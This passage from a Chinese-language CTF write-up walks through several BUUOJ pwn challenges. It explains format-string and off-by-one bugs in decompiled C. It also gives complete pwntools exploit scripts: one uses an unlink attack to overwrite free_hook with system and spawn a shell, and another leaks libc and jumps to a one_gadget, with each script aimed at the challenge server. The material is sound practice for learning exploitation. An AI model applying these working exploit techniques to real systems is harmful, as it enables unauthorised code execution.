class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;None!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        edit_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No such choices!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是一个菜单堆</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">banner</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">12</span>]; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to note management system!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, format);                 <span class="comment">// 一个栈溢出</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);                               <span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n-------------------------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>banner函数中有一个栈溢出和格式化字符串漏洞，但是由于Canary的保护，他是无法进行栈溢出的，因此只能泄露了，而泄露的话一次性泄露code基址和libc基址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the index you want to create (0-10):&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">0xB</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( counts &gt; <span class="number">0xA</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;full!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter a size:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">    <span class="keyword">if</span> ( key == <span class="number">43</span> )                            <span class="comment">// 用格式化字符串漏洞改key为43</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Enter the content: &quot;</span>);</span><br><span class="line">      v0 = index;</span><br><span class="line">      *((_QWORD *)&amp;note + <span class="number">2</span> * (<span class="type">int</span>)v0) = <span class="built_in">malloc</span>(size);</span><br><span class="line">      *((_DWORD *)&amp;note + <span class="number">4</span> * (<span class="type">int</span>)index + <span class="number">2</span>) = size;</span><br><span class="line">      <span class="keyword">if</span> ( !*((_QWORD *)&amp;note + <span class="number">2</span> * (<span class="type">int</span>)index) )</span><br><span class="line">      &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;error&quot;</span>, <span class="number">1uLL</span>, <span class="number">5uLL</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                        <span class="comment">// 不改key只能进行这个</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( size &lt;= <span class="number">0x80</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t hack me!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Enter the content: &quot;</span>);</span><br><span class="line">      v1 = index;</span><br><span class="line">      *((_QWORD *)&amp;note + <span class="number">2</span> * (<span class="type">int</span>)v1) = <span class="built_in">malloc</span>(size);</span><br><span class="line">      *((_DWORD *)&amp;note + <span class="number">4</span> * (<span class="type">int</span>)index + <span class="number">2</span>) = size;</span><br><span class="line">      <span class="keyword">if</span> ( !*((_QWORD *)&amp;note + <span class="number">2</span> * (<span class="type">int</span>)index) )</span><br><span class="line">      &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;error&quot;</span>, <span class="number">1uLL</span>, <span class="number">5uLL</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)check_pass((<span class="type">char</span> *)&amp;note + <span class="number">16</span> * (<span class="type">int</span>)index) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;go out!hacker!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    get_input(*((_QWORD *)&amp;note + <span class="number">2</span> * (<span class="type">int</span>)index), size);<span class="comment">// off by one</span></span><br><span class="line">    ++counts;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t hack me!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中漏洞点在于get_input函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> __fastcall <span class="title function_">get_input</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (_BYTE *)(v3 + a1);</span><br><span class="line">    result = fread(v4, <span class="number">1uLL</span>, <span class="number">1uLL</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)result &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v4 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        result = v3 + a1;</span><br><span class="line">        *v4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = (<span class="type">unsigned</span> <span class="type">int</span>)++v3;</span><br><span class="line">      <span class="keyword">if</span> ( a2 + <span class="number">1</span> &lt;= (<span class="type">unsigned</span> <span class="type">int</span>)v3 )         <span class="comment">// off by one，写了a2+1个字节</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个off-by-one</p><p>这样还有edit，delete可以有思路即unlink改free_hook为system，之后free(‘&#x2F;bin&#x2F;sh\x00’)即可（但是好像(lll￢ω￢)key没用到）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./axb&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27457</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line">pal=<span class="string">b&#x27;%15$p.%19$p&#x27;</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sla(<span class="string">&#x27;Enter your name: &#x27;</span>,pal)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">ru(<span class="string">&#x27;Hello, 0x&#x27;</span>)</span><br><span class="line"><span class="comment">#data=p64(int(r(12),16))</span></span><br><span class="line">start_main=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&#x27;.0x&#x27;</span>)</span><br><span class="line">bss_addr=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x116a</span>+<span class="number">0x202000</span></span><br><span class="line">leak(<span class="string">&#x27;bss_addr&#x27;</span>,bss_addr)</span><br><span class="line">leak(<span class="string">&#x27;start_main&#x27;</span>,start_main)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">libc_base=start_main-<span class="number">0x20830</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">system_addr=libc_base+<span class="number">0x45390</span></span><br><span class="line">free_hook=libc_base+<span class="number">0x3C67A8</span></span><br><span class="line">leak(<span class="string">&#x27;free_hook&#x27;</span>,free_hook)</span><br><span class="line">leak(<span class="string">&#x27;system&#x27;</span>,system_addr)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Enter the index you want to create (0-10):&#x27;</span>,tbs(index))</span><br><span class="line">    sla(<span class="string">&#x27;Enter a size:\n&#x27;</span>,tbs(size))</span><br><span class="line">    sla(<span class="string">&#x27;Enter the content: \n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Enter an index:\n&#x27;</span>,tbs(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Enter an index:\n&#x27;</span>,tbs(index))</span><br><span class="line">    sla(<span class="string">&#x27;Enter the content: \n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#enter size&gt;0x80 else exit</span></span><br><span class="line">note_addr=bss_addr+<span class="number">0x60</span></span><br><span class="line">fake_fd=note_addr-<span class="number">0x8</span></span><br><span class="line">fake_bk=note_addr</span><br><span class="line">pal=p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(fake_fd)+p64(fake_bk)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x90</span>)+<span class="string">b&#x27;\xa0&#x27;</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>,<span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>,<span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x98</span>,<span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x98</span>,<span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,pal)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x98</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">pal=p64(<span class="number">0</span>)+p64(free_hook)+p64(<span class="number">0x98</span>)</span><br><span class="line">edit(<span class="number">1</span>,pal)</span><br><span class="line">edit(<span class="number">0</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">debug()</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h1 id="oneshot-tjctf-2016"><a href="#oneshot-tjctf-2016" class="headerlink" title="oneshot_tjctf_2016"></a>oneshot_tjctf_2016</h1><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653177.png" alt="image-20240508205504223" style="zoom:50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 (*v4)(<span class="type">void</span>); <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Read location?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Value: 0x%016lx\n&quot;</span>, *(_QWORD *)v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Jump location?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good luck!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v4();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：long int在linux是8字节的，在windows是4字节的（无论32 or 64）</p></blockquote><p>这里首先是让我们输入v4的值然后泄露v4作为地址其上内容的值，之后还能再次输入v4的值，之后以v4为函数基址执行函数，就想到首先先泄露libc然后执行one_gadget（属实可供操控的内容较少只能试试看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./oneshot&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26690</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">p=run()</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sla(<span class="string">&#x27;Read location?\n&#x27;</span>,<span class="built_in">str</span>(puts_got))</span><br><span class="line">ru(<span class="string">&#x27;Value: 0x&#x27;</span>)</span><br><span class="line">puts_addr=<span class="built_in">int</span>(r(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;puts_addr&#x27;</span>,puts_addr)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">libc_base=puts_addr-<span class="number">0x6F690</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">one_gadget=libc_base+<span class="number">0x45216</span> <span class="comment">#0x45216 0x4526a 0xf02a4 0xf1147</span></span><br><span class="line">sla(<span class="string">&#x27;Jump location?\n&#x27;</span>,<span class="built_in">str</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>也算是运气不错，一把过</p><h1 id="wustctf2020-number-game"><a href="#wustctf2020-number-game" class="headerlink" title="wustctf2020_number_game"></a>wustctf2020_number_game</h1><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653178.png" alt="image-20240508213032791" style="zoom:50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> || (v1 = -v1, v1 &gt;= <span class="number">0</span>) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You lose&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    shell();</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题要绕过第一个if然后就能实现shell了，那绕过变成了困难，首先v1是int型范围在-2147483648~2147483647之间，那么如果取-2147483648他的原码是0x80000000，而取反是取补码然后+1，所以他的补码也是0x80000000，就能实现shell</p><h1 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a>starctf_2019_babyshell</h1><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653179.png" alt="image-20240508215231736" style="zoom:50%;" /><p>这题算是一个\x00的妙用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+0h] 